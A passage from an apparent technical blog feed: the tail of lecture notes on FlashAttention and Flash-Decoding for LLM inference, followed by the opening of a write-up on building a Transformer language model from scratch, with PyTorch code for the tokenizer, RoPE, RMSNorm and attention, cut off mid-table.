block</li><li>Update output in device memory by scaling</li></ol><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182250362.png" alt="image-20260209182250362" style="zoom:50%;" /></p><h4 id="recomputation">2. Recomputation</h4><p>Don’t store attention matrix from forward pass, recompute it inbackward pass</p><p><strong>Tradeoff</strong>: Increases FLOPs but reduces memory I/O</p><blockquote><p>In the GPU, the bandwidth is the bottleneck</p></blockquote><table><thead><tr class="header"><th>Metric</th><th>Standard</th><th>FlashAttention</th></tr></thead><tbody><tr class="odd"><td>GFLOPs</td><td>66.6</td><td>75.2 (+13%)</td></tr><tr class="even"><td>Global mem access</td><td>40.3 GB</td><td>4.4 GB (-89%)</td></tr><tr class="odd"><td>Runtime</td><td>41.7 ms</td><td>7.3 ms (<strong>5.7x faster</strong>)</td></tr></tbody></table><h3 id="safe-softmax-and-online-softmax">Safe Softmax and OnlineSoftmax</h3><p><strong>Problem</strong>: Maximum value for 16-bit floating point is65504 (&lt; <span class="math inline">\(e^{12}\)</span>)</p><p><strong>Solution</strong>: Compute softmax of vector <spanclass="math inline">\(x\)</span> as:</p><p><span class="math display">\[m(x) := \max_i x_i\]</span> <span class="math display">\[f(x) := [e^{x_1-m(x)}, \ldots, e^{x_n-m(x)}]\]</span> <span class="math display">\[\ell(x) := \sum_i f(x)_i\]</span> <span class="math display">\[\text{softmax}(x) := \frac{f(x)}{\ell(x)}\]</span></p><p>For two vectors <span class="math inline">\(x^{(1)}\)</span> and<span class="math inline">\(x^{(2)}\)</span>:</p><p><span class="math display">\[m(x) = m([x^{(1)} \, x^{(2)}]) = \max(m(x^{(1)}), m(x^{(2)}))\]</span></p><p><span class="math display">\[f(x) = [e^{m(x^{(1)})-m(x)} f(x^{(1)}), \, e^{m(x^{(2)})-m(x)}f(x^{(2)})]\]</span></p><p><span class="math display">\[\ell(x) = e^{m(x^{(1)})-m(x)} \ell(x^{(1)}) + e^{m(x^{(2)})-m(x)}\ell(x^{(2)})\]</span></p><h3 id="flashattention-2-algorithm">FlashAttention-2 Algorithm</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182344432.png" alt="image-20260209182344432" style="zoom:50%;" /></p><h3 id="parallelization-strategy">Parallelization Strategy</h3><p><strong>Thread Block Level:</strong> - Step 1: Assign different<strong>heads</strong> to different thread blocks (16-64 heads) - Step2: Assign different <strong>queries</strong> to different thread blocks- <strong>Why not partition keys/values?</strong> Thread blocks cannotcommunicate; cannot perform softmax when partitioning keys/values</p><p><strong>Warp Level:</strong> - FlashAttention: Split across K/Vrequires communication to add results ❌ - FlashAttention-2: Splitacross Q avoids communication ✅</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182623284.png" alt="image-20260209182623284" style="zoom:50%;" /></p><h4 id="why-different-parallelization-for-forward-vs-backward-pass">WhyDifferent Parallelization for Forward vs Backward Pass?</h4><p><strong>Forward Pass (Parallelize by Rows/Queries):</strong> -Computing <span class="math inline">\(O = \text{softmax}(QK^T)V\)</span>- Each thread block processes different query rows independently -<strong>No communication needed</strong> - different rows are completelyindependent - Like students working on different problemsindependently</p><p><strong>Backward Pass (Parallelize by Columns/Keys-Values):</strong>- Computing gradients requires updating <spanclass="math inline">\(dQ\)</span>: <span class="math display">\[dQ_i =dQ_i + dS^{(j)} K_j\]</span> - This update requires<strong>accumulation</strong> across different K/V blocks - Each columnblock contributes to the same <span class="math inline">\(dQ\)</span>row - Requires <strong>atomic operations</strong> through HBM tocoordinate updates - Like students working on different parts of thesame problem - results must be combined</p><p><strong>Key Difference:</strong> Forward pass has independent rowcomputations, but backward pass needs to accumulate contributions fromdifferent blocks, requiring synchronization through HBM with atomicadds.</p><h3 id="performance">Performance</h3><p><strong>FlashAttention achieves:</strong> - <strong>2-4xspeedup</strong> over PyTorch and other baselines - <strong>10-20xmemory reduction</strong> - <strong>Linear memory</strong> scaling withsequence length (vs quadratic)</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182708246.png" alt="image-20260209182708246" style="zoom:50%;" /></p><h2 id="generative-llm-inference-autoregressive-decoding">Generative LLMInference: Autoregressive Decoding</h2><h3 id="two-phases">Two Phases</h3><h4 id="pre-filling-phase-iteration-0">1. Pre-filling Phase (Iteration0)</h4><ul><li>Process <strong>all</strong> input tokens at once</li><li>Compute attention for entire prompt</li><li>Example: <code>[Accelerating LLM requires machine]</code> → output:<code>learning</code></li></ul><h4 id="decoding-phase-iterations-1">2. Decoding Phase (Iterations1+)</h4><ul><li>Process a <strong>single</strong> token generated from previousiteration</li><li>Use attention keys &amp; values of all previous tokens</li><li>Example iterations:<ul><li>Iter 1: <code>learning</code> → <code>systems</code></li><li>Iter 2: <code>systems</code> → <code>optimizations</code></li><li>Iter 3: <code>optimizations</code> → <code>[EOS]</code></li></ul></li></ul><h3 id="key-value-cache">Key-Value Cache</h3><p><strong>Purpose</strong>: Save attention keys and values forfollowing iterations to avoid recomputation</p><p><strong>Memory</strong>: Grows linearly with sequence length</p><p><strong>Attention computation in decoding:</strong></p><ul><li>Query: single new token</li><li>Keys/Values: all previous tokens (from cache)</li></ul><h2 id="flashattention-for-llm-inference">FlashAttention for LLMInference</h2><h3 id="applicability">Applicability</h3><p><strong>Pre-filling phase:</strong> ✅ <strong>Yes</strong> - Cancompute different queries using different thread blocks/warps</p><p><strong>Decoding phase:</strong> ❌ <strong>No</strong> - There isonly a single query in the decoding phase - FlashAttention processes K/V<strong>sequentially</strong> - <strong>Inefficient for requests withlong context</strong> (many keys/values)</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182830017.png" alt="image-20260209182830017" style="zoom:30%;" /></p><h2 id="flash-decoding-parallel-attention-for-decoding">Flash-Decoding:Parallel Attention for Decoding</h2><h3 id="key-insight">Key Insight</h3><p>Attention is <strong>associative</strong> and<strong>commutative</strong> - can be split and reduced</p><h3 id="approach">Approach</h3><ol type="1"><li><strong>Split</strong> keys/values into small chunks</li><li><strong>Compute</strong> attention with these splits usingFlashAttention (in parallel)</li><li><strong>Reduce</strong> results across all splits</li></ol><h3 id="performance-1">Performance</h3><p><strong>Flash-Decoding is up to 8x faster</strong> than prior workfor long contexts</p><p><strong>Example (CodeLlama-34b, bs=1, MP=4):</strong> - Sequencelength 1K: ~47 tok/s (similar to others) - Sequence length 16K: ~38tok/s vs ~5 tok/s (FlashAttention) - <strong>Maintains highthroughput</strong> even for very long sequences</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182919673.png" alt="image-20260209182919673" style="zoom:30%;" /></p><h2 id="summary">Summary</h2><ol type="1"><li><strong>Attention mechanism</strong> is core to Transformer models,with <span class="math inline">\(O(N^2)\)</span> complexity</li><li><strong>Multi-head attention</strong> provides parallelism andrepresentation diversity</li><li><strong>FlashAttention</strong> uses tiling and recomputation toachieve IO-efficiency:<ul><li>2-4x speedup, 10-20x memory reduction</li><li>Enables longer sequence lengths</li></ul></li><li><strong>LLM inference</strong> has two phases with differentcomputation patterns:<ul><li>Pre-filling: many queries (batched)</li><li>Decoding: single query (sequential)</li></ul></li><li><strong>Flash-Decoding</strong> parallelizes across keys/values forefficient long-context decoding:<ul><li>Up to 8x faster for long sequences</li><li>Critical for applications requiring large context windows</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> CMU 15-642 ML Systems </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> ML Systems </tag>
            
            <tag> 15642 </tag>
            
            <tag> Transformer </tag>
            
            <tag> Attention </tag>
            
            <tag> FlashAttention </tag>
            
            <tag> GPU Optimization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS336 Assignment 1: Building a Transformer Language Model from Scratch</title>
      <link href="/2026/02/09/CS336/CS336-Assignment-1-Building-a-Transformer-Language-Model-from-Scratch/"/>
      <url>/2026/02/09/CS336/CS336-Assignment-1-Building-a-Transformer-Language-Model-from-Scratch/</url>
      
        <content type="html"><![CDATA[<h1id="cs336-assignment-1-building-a-transformer-language-model-from-scratch">CS336Assignment 1: Building a Transformer Language Model from Scratch</h1><blockquote><p>A comprehensive reflection on implementing a complete Transformerlanguage model pipeline — from BPE tokenizer to text generation —trained on TinyStories and OpenWebText.</p></blockquote><hr /><h2 id="table-of-contents">Table of Contents</h2><ol type="1"><li><a href="#1-overview">Overview</a></li><li><a href="#2-bpe-tokenizer">BPE Tokenizer</a></li><li><a href="#3-transformer-architecture">TransformerArchitecture</a></li><li><a href="#4-training-infrastructure">TrainingInfrastructure</a></li><li><a href="#5-training-loop">Training Loop</a></li><li><a href="#6-text-generation">Text Generation</a></li><li><a href="#7-experiments">Experiments</a></li><li><a href="#8-reflections">Reflections</a></li></ol><hr /><h2 id="overview">1. Overview</h2><p>This assignment implements a complete Transformer language modelpipeline from scratch, without relying on high-level libraries like<code>torch.nn.Linear</code> or <code>torch.nn.Embedding</code>. Thecodebase covers:</p><ul><li><strong>Byte-Pair Encoding (BPE) tokenizer</strong> with parallelpre-tokenization</li><li><strong>Decoder-only Transformer</strong> with RMSNorm, RoPE,SwiGLU, and causal multi-head attention</li><li><strong>Training infrastructure</strong>: AdamW optimizer, cosine LRschedule, gradient clipping, data loading, checkpointing</li><li><strong>Autoregressive text generation</strong> with temperature andnucleus (top-p) sampling</li><li><strong>Experiments</strong>: learning rate sweeps, batch sizestudies, architectural ablations, and OpenWebText training</li></ul><p><strong>Full code available on GitHub</strong>: <ahref="https://github.com/XLOverflow/CS336_Transformer_from_Scratch">https://github.com/XLOverflow/CS336_Transformer_from_Scratch</a></p><h3 id="project-structure">Project Structure</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cs336_basics/</span><br><span class="line">├── model/</span><br><span class="line">│   ├── linear.py              # Linear (no bias)</span><br><span class="line">│   ├── embedding.py           # Token Embedding</span><br><span class="line">│   ├── normalization.py       # RMSNorm</span><br><span class="line">│   ├── positional_encoding.py # RoPE</span><br><span class="line">│   ├── attention.py           # Softmax, Scaled Dot-Product Attention, Multi-Head Self-Attention</span><br><span class="line">│   ├── feedforward.py         # SwiGLU, SiLUFFN</span><br><span class="line">│   ├── transformer_block.py   # Pre-norm / Post-norm Transformer Block</span><br><span class="line">│   ├── transformer_lm.py      # Full Transformer LM with generate()</span><br><span class="line">│   └── config.py              # Model configurations (TinyStories, GPT-2 family)</span><br><span class="line">├── tokenizers/</span><br><span class="line">│   ├── bpe.py                 # BPE trainer with parallel pre-tokenization</span><br><span class="line">│   └── tokenizer.py           # BPE encode/decode with parallel encoding</span><br><span class="line">└── training/</span><br><span class="line">    ├── cross_entropy.py       # Numerically stable cross-entropy</span><br><span class="line">    ├── adamw.py               # AdamW optimizer (from scratch)</span><br><span class="line">    ├── lr_schedule.py         # Cosine annealing with linear warmup</span><br><span class="line">    ├── gradient_clipping.py   # L2-norm gradient clipping</span><br><span class="line">    ├── data_loader.py         # Random batch sampling</span><br><span class="line">    └── checkpointing.py       # Save/load model checkpoints</span><br></pre></td></tr></table></figure><hr /><h2 id="bpe-tokenizer">2. BPE Tokenizer</h2><h3 id="unicode-basics">2.1 Unicode Basics</h3><p><strong>Q: What’s the relationship between Unicode code points andUTF-8 encoding?</strong></p><p>Unicode assigns each character a unique <strong>code point</strong>(e.g., <code>U+0041</code> for ‘A’). UTF-8 is a <strong>variable-lengthencoding</strong> that maps code points to 1–4 bytes:</p><table><thead><tr class="header"><th>Code Point Range</th><th>UTF-8 Bytes</th><th>Example</th></tr></thead><tbody><tr class="odd"><td>U+0000 – U+007F</td><td>1 byte</td><td>ASCII characters</td></tr><tr class="even"><td>U+0080 – U+07FF</td><td>2 bytes</td><td>Latin, Greek, Cyrillic</td></tr><tr class="odd"><td>U+0800 – U+FFFF</td><td>3 bytes</td><td>CJK characters, most emoji</td></tr><tr class="even"><td>U+10000 – U+10FFFF</td><td>4 bytes</td><td>Rare emoji, historic scripts</td></tr></tbody></table><p>UTF-8 is backwards-compatible with ASCII and self-synchronizing: youcan always tell if a byte is the start of a character or a continuationbyte.</p><p><strong>Q: Why use byte-level tokenization instead ofcharacter-level?</strong></p><p>Byte-level tokenization starts with a base vocabulary of 256 bytevalues, which can represent <strong>any</strong> text in any languagewithout unknown tokens. Character-level tokenization would need tohandle the full Unicode range (143,000+ characters) as the basevocabulary.</p><h3 id="bpe-training-algorithm">2.2 BPE Training Algorithm</h3><p>The core BPE training process:</p><ol type="1"><li><strong>Initialize vocabulary</strong> with 256 byte values +special tokens (e.g., <code>&lt;|endoftext|&gt;</code>)</li><li><strong>Pre-tokenize</strong> corpus using GPT-2 regex pattern tosplit text into “words”</li><li><strong>Iteratively merge</strong> the most frequent adjacent bytepair, adding the merged token to the vocabulary</li><li>Repeat until reaching target vocabulary size</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PAT = <span class="string">r&quot;&quot;&quot;&#x27;(?:[sdmt]|ll|ve|re)| ?\p&#123;L&#125;+| ?\p&#123;N&#125;+| ?[^\s\p&#123;L&#125;\p&#123;N&#125;]+|\s+(?!\S)|\s+&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>This regex pattern handles English contractions (<code>'s</code>,<code>'t</code>, <code>'ll</code>, etc.), words with optional leadingspace, numbers, punctuation, and whitespace.</p><h3 id="parallelization-strategy">2.3 Parallelization Strategy</h3><p>Training a BPE tokenizer on large corpora (e.g., OpenWebText) iscomputationally expensive. My implementation uses <strong>parallelpre-tokenization</strong> with multiprocessing:</p><ol type="1"><li><strong>Find chunk boundaries</strong> aligned to<code>&lt;|endoftext|&gt;</code> tokens to avoid splittingdocuments</li><li><strong>Distribute chunks</strong> across workers using<code>multiprocessing.Pool</code></li><li>Each worker applies regex pre-tokenization and returns<strong>frequency counts</strong> (<code>Counter</code>)</li><li><strong>Merge frequency counts</strong> incrementally in the mainprocess to control memory usage</li><li>BPE merging runs sequentially (since each merge depends on theprevious one)</li></ol><p>Key optimizations:</p><ul><li><strong>Memory management</strong>: Periodic garbage collection andindex rebuilds every 5000 merges to reduce memory fragmentation</li><li><strong>Incremental pair updates</strong>: Instead of recomputingall pair frequencies from scratch after each merge, we maintain<code>pair_to_tuples</code> and <code>pair_freq</code> indices andupdate only the affected entries</li><li><strong>Batch processing</strong>: Workers process chunks in batchesof 16 to control concurrent memory usage</li></ul><h3 id="tokenizer-experiments">2.4 Tokenizer Experiments</h3><p><strong>Vocabulary size comparison on TinyStories:</strong></p><p>For the TinyStories dataset, I trained tokenizers with vocab_size =10,000. The tokenizer successfully learns common English words andsubword patterns. For example:</p><ul><li>Common words like “the”, “and”, “once” become single tokens</li><li>Less common words are split into learned subword units</li><li><code>&lt;|endoftext|&gt;</code> is handled as a special token thatdoesn’t participate in BPE merging</li></ul><p><strong>Encoding</strong>: The encoder applies BPE merges greedily —for each pre-tokenized word, it starts with individual bytes andrepeatedly merges the highest-priority pair (earliest in the merge list)until no more merges are applicable.</p><p><strong>Decoding</strong>: Simply concatenates the byte values foreach token ID and decodes the result as UTF-8.</p><hr /><h2 id="transformer-architecture">3. Transformer Architecture</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208223722664.png" alt="image-20260208223722664" style="zoom:50%;" /></p><h3 id="linear-layer-no-bias">3.1 Linear Layer (No Bias)</h3><p>Following modern LLM practices (PaLM, LLaMA), all linear layers omitthe bias term:</p><p><span class="math display">\[y = xW^T\]</span></p><p><strong>Initialization</strong>: Truncated normal distribution <spanclass="math inline">\(\mathcal{N}(0, \sigma^2)\)</span> where <spanclass="math inline">\(\sigma = \sqrt{2 / (d_{in} + d_{out})}\)</span>,truncated at <span class="math inline">\([-3\sigma,3\sigma]\)</span>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Linear</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, in_features, out_features, device=<span class="literal">None</span>, dtype=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.weight = nn.Parameter(torch.empty(out_features, in_features, device=device, dtype=dtype))</span><br><span class="line">        std = (<span class="number">2</span> / (in_features + out_features)) ** <span class="number">0.5</span></span><br><span class="line">        nn.init.trunc_normal_(<span class="variable language_">self</span>.weight, mean=<span class="number">0.0</span>, std=std, a=-<span class="number">3</span>*std, b=<span class="number">3</span>*std)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> einsum(x, <span class="variable language_">self</span>.weight, <span class="string">&quot;... i, o i -&gt; ... o&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="token-embedding">3.2 Token Embedding</h3><p>Simple lookup table mapping token IDs to dense vectors:</p><p><span class="math display">\[\text{embed}(x) = E[x]\]</span></p><p>where <span class="math inline">\(E \in \mathbb{R}^{V \timesd_{model}}\)</span> is initialized with truncated normal <spanclass="math inline">\(\mathcal{N}(0, 1)\)</span>.</p><h3 id="rmsnorm">3.3 RMSNorm</h3><p>Root Mean Square Layer Normalization (Zhang &amp; Sennrich, 2019),used in LLaMA instead of LayerNorm:</p><p><span class="math display">\[\text{RMSNorm}(x) = \frac{x}{\text{RMS}(x)} \cdot \gamma, \quad\text{RMS}(x) = \sqrt{\frac{1}{d}\sum_{i=1}^d x_i^2 + \epsilon}\]</span></p><p>Key implementation detail: <strong>cast to float32</strong> fornumerical stability before computing RMS, then cast back to the originaldtype.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">    original_dtype = x.dtype</span><br><span class="line">    x = x.to(torch.float32)</span><br><span class="line">    rms = torch.sqrt(torch.mean(x ** <span class="number">2</span>, dim=-<span class="number">1</span>, keepdim=<span class="literal">True</span>) + <span class="variable language_">self</span>.eps)</span><br><span class="line">    normalized = x / rms</span><br><span class="line">    <span class="keyword">return</span> (normalized * <span class="variable language_">self</span>.weight).to(original_dtype)</span><br></pre></td></tr></table></figure><h3 id="rotary-position-embedding-rope">3.4 Rotary Position Embedding(RoPE)</h3><p>RoPE (Su et al., 2021) encodes <strong>relative</strong> positioninformation by applying rotation to query and key vectors:</p><p><span class="math display">\[\text{RoPE}(x, m) = \begin{pmatrix} x_0 \cos(m\theta_0) - x_1\sin(m\theta_0) \\ x_0 \sin(m\theta_0) + x_1 \cos(m\theta_0) \\ \vdots\\ x_{d-2} \cos(m\theta_{d/2-1}) - x_{d-1} \sin(m\theta_{d/2-1}) \\x_{d-2} \sin(m\theta_{d/2-1}) + x_{d-1} \cos(m\theta_{d/2-1})\end{pmatrix}\]</span></p><p>where <span class="math inline">\(\theta_k =\theta_{\text{base}}^{-2k/d_k}\)</span> for <spanclass="math inline">\(k = 0, \ldots, d_k/2 - 1\)</span>.</p><p>Key properties:</p><ul><li><strong>No learnable parameters</strong>: RoPE is purely computedfrom positions and frequencies</li><li>Applied to Q and K only (not V)</li><li>Captures <strong>relative</strong> positions: <spanclass="math inline">\(q_m^T k_n\)</span> depends only on <spanclass="math inline">\(m - n\)</span></li><li>Shared across all layers (one RoPE module instance)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RotaryPositionalEmbedding</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, theta, d_k, max_seq_len, device=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        theta_k = theta ** (-<span class="number">2</span> * torch.arange(d_k // <span class="number">2</span>, device=device) / d_k)</span><br><span class="line">        positions = torch.arange(max_seq_len, device=device).unsqueeze(<span class="number">1</span>)</span><br><span class="line">        angles = positions * theta_k.unsqueeze(<span class="number">0</span>)</span><br><span class="line">        <span class="variable language_">self</span>.register_buffer(<span class="string">&quot;sin&quot;</span>, torch.sin(angles), persistent=<span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.register_buffer(<span class="string">&quot;cos&quot;</span>, torch.cos(angles), persistent=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, token_positions</span>):</span><br><span class="line">        sin, cos = <span class="variable language_">self</span>.sin[token_positions], <span class="variable language_">self</span>.cos[token_positions]</span><br><span class="line">        x1, x2 = x[..., ::<span class="number">2</span>], x[..., <span class="number">1</span>::<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">return</span> torch.stack((x1 * cos - x2 * sin, x1 * sin + x2 * cos), dim=-<span class="number">1</span>).flatten(-<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h3 id="softmax">3.5 Softmax</h3><p>Numerically stable softmax using the max-subtraction trick:</p><p><span class="math display">\[\text{softmax}(x)_i = \frac{e^{x_i - \max(x)}}{\sum_j e^{x_j - \max(x)}}\]</span></p><h3 id="scaled-dot-product-attention">3.6 Scaled Dot-ProductAttention</h3><p><span class="math display">\[\text{Attention}(Q, K, V) =\text{softmax}\left(\frac{QK^T}{\sqrt{d_k}}\right)V\]</span></p><p>The <span class="math inline">\(\sqrt{d_k}\)</span> scaling preventsthe dot products from growing too large in magnitude, which would pushthe softmax into regions with extremely small gradients.</p><p>Implementation uses <code>einops.einsum</code> for clarity andsupports arbitrary batch dimensions:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">attn_scores = einsum(q, k, <span class="string">&quot;b ... q d_k, b ... k d_k -&gt; b ... q k&quot;</span>) / (d_k ** <span class="number">0.5</span>)</span><br><span class="line">attn_scores = attn_scores.masked_fill(~mask, <span class="built_in">float</span>(<span class="string">&quot;-inf&quot;</span>))  <span class="comment"># causal mask</span></span><br><span class="line">attn_weights = softmax(attn_scores, dim=-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> einsum(attn_weights, v, <span class="string">&quot;b ... q k, b ... k d_v -&gt; b ... q d_v&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="multi-head-self-attention">3.7 Multi-Head Self-Attention</h3><p>Splits the model dimension into multiple heads for parallelattention:</p><p><span class="math display">\[\text{MultiHead}(x) = W_O \cdot \text{Concat}(\text{head}_1, \ldots,\text{head}_h)\]</span></p><p><span class="math display">\[\text{head}_i = \text{Attention}(xW_Q^i, xW_K^i, xW_V^i)\]</span></p><p>Process:</p><ol type="1"><li>Project input to Q, K, V using separate linear layers</li><li>Reshape to separate heads:<code>(batch, seq_len, d_model) → (batch, num_heads, seq_len, d_k)</code></li><li>Apply RoPE to Q and K</li><li>Apply scaled dot-product attention with causal mask (lowertriangular)</li><li>Concatenate heads and project back</li></ol><h3 id="feed-forward-networks">3.8 Feed-Forward Networks</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208223809903.png" alt="image-20260208223809903" style="zoom: 50%;" /></p><p><strong>SwiGLU</strong> (Shazeer, 2020): Gated FFN with SiLUactivation <span class="math display">\[\text{SwiGLU}(x) = W_2 \cdot (\text{SiLU}(W_1 x) \odot W_3 x)\]</span></p><p>where <span class="math inline">\(\text{SiLU}(x) = x \cdot\sigma(x)\)</span> and <span class="math inline">\(\odot\)</span> iselement-wise multiplication.</p><p>SwiGLU uses <span class="math inline">\(d_{ff} \approx \frac{8}{3}d_{model}\)</span> (rounded to multiple of 64) with 3 weight matrices,giving total parameters <span class="math inline">\(\approx 3 \timesd_{model} \times \frac{8}{3} d_{model} = 8 d_{model}^2\)</span>.</p><p><strong>SiLU FFN</strong> (for ablation): Standard 2-layer FFN</p><p><span class="math display">\[\text{SiLUFFN}(x) = W_2 \cdot \text{SiLU}(W_1 x)\]</span></p><p>Uses <span class="math inline">\(d_{ff} = 4 \times d_{model}\)</span>with 2 weight matrices, giving total parameters <spanclass="math inline">\(\approx 2 \times d_{model} \times 4 d_{model} = 8d_{model}^2\)</span>. This matches SwiGLU’s parameter count for fairablation comparison.</p><h3 id="transformer-block">3.9 Transformer Block</h3><p><strong>Pre-norm</strong> (default): <span class="math display">\[z = x + \text{Attention}(\text{RMSNorm}(x))\]</span></p><p><span class="math display">\[y = z + \text{FFN}(\text{RMSNorm}(z))\]</span></p><p><strong>Post-norm</strong> (ablation): <span class="math display">\[z = \text{RMSNorm}(x + \text{Attention}(x))\]</span></p><p><span class="math display">\[y = \text{RMSNorm}(z + \text{FFN}(z))\]</span></p><p>Pre-norm is preferred in modern LLMs because it stabilizes training —the residual connection preserves the magnitude of the input, andnormalization before the sublayer prevents the activations from growingunboundedly.</p><h3 id="full-transformer-lm">3.10 Full Transformer LM</h3><p>The complete decoder-only architecture:</p><ol type="1"><li><strong>Token Embedding</strong>:<code>token_ids → (batch, seq_len, d_model)</code></li><li><strong>N Transformer Blocks</strong>: Apply self-attention + FFNwith residual connections</li><li><strong>Final RMSNorm</strong>: Normalize the output</li><li><strong>LM Head</strong>: Linear projection to vocabulary logits<code>(batch, seq_len, vocab_size)</code></li></ol><h3id="transformer-accounting-parameters-memory-flops-training-time">3.11Transformer Accounting: Parameters, Memory, FLOPs &amp; TrainingTime</h3><blockquote><p>Let <span class="math inline">\(B\)</span> = batch_size, <spanclass="math inline">\(T\)</span> = context_length, <spanclass="math inline">\(d\)</span> = d_model, <spanclass="math inline">\(L\)</span> = num_layers, <spanclass="math inline">\(H\)</span> = num_heads, <spanclass="math inline">\(V\)</span> = vocab_size, <spanclass="math inline">\(d_{ff} = 4d\)</span></p></blockquote><h4 id="parameter-count-p">3.11.1 Parameter Count <spanclass="math inline">\(P\)</span></h4><table><colgroup><col style="width: 55%" /><col style="width: 44%" /></colgroup><thead><tr class="header"><th>Component</th><th>Parameters</th></tr></thead><tbody><tr class="odd"><td>Per-layer Attention (<span class="math inline">\(W_Q, W_K, W_V,W_O\)</span>)</td><td><span class="math inline">\(4d^2\)</span></td></tr><tr class="even"><td>Per-layer FFN (SwiGLU: <span class="math inline">\(W_1, W_2,W_3\)</span>)</td><td><span class="math inline">\(3 \times d \times d_{ff} =12d^2\)</span></td></tr><tr class="odd"><td>Per-layer RMSNorm ×2</td><td><span class="math inline">\(2d\)</span></td></tr><tr class="even"><td>Token Embedding</td><td><span class="math inline">\(Vd\)</span></td></tr><tr class="odd"><td>LM Head</td><td><span class="math inline">\(Vd\)</span></td></tr><tr class="even"><td>Final RMSNorm</td><td><span class="math inline">\(d\)</span></td></tr></tbody></table><p><span class="math display">\[\boxed{P = L(16d^2 + 2d) + 2Vd + d}\]</span></p><h4 id="training-memory-analysis">3.11.2 Training Memory Analysis</h4><p>During training, GPU memory consists of four parts (float32 = 4bytes):</p><table><colgroup><col style="width: 18%" /><col style="width: 11%" /><col style="width: 70%" /></colgroup><thead><tr class="header"><th>Component</th><th>Formula</th><th>Description</th></tr></thead><tbody><tr class="odd"><td>Parameters</td><td><span class="math inline">\(4P\)</span></td><td>4 bytes per parameter</td></tr><tr class="even"><td>Gradients</td><td><span class="math inline">\(4P\)</span></td><td>Same size as parameters</td></tr><tr class="odd"><td>Optimizer (m+v)</td><td><span class="math inline">\(8P\)</span></td><td>AdamW stores 2 tensors with the same shape as parameters</td></tr><tr class="even"><td>Activations</td><td>See below</td><td>Proportional to batch_size</td></tr></tbody></table><p><strong>Per-layer activation memory</strong> (intermediate resultssaved for backpropagation):</p><table><thead><tr class="header"><th>Component</th><th>Shape</th><th>Element Count</th></tr></thead><tbody><tr class="odd"><td>RMSNorm inputs ×2</td><td><span class="math inline">\((B,T,d)\)</span> ×2</td><td><span class="math inline">\(2BTd\)</span></td></tr><tr class="even"><td>Q, K, V</td><td><span class="math inline">\((B,T,d)\)</span> ×3</td><td><span class="math inline">\(3BTd\)</span></td></tr><tr class="odd"><td>Softmax output</td><td><span class="math inline">\((B,H,T,T)\)</span></td><td><span class="math inline">\(BHT^2\)</span></td></tr><tr class="even"><td>Attention output</td><td><span class="math inline">\((B,T,d)\)</span></td><td><span class="math inline">\(BTd\)</span></td></tr><tr class="odd"><td>W1 output (for SiLU backward)</td><td><span class="math inline">\((B,T,d_{ff})\)</span></td><td><span class="math inline">\(4BTd\)</span></td></tr><tr class="even"><td>W3 output</td><td><span class="math inline">\((B,T,d_{ff})\)</span></td><td><span class="math 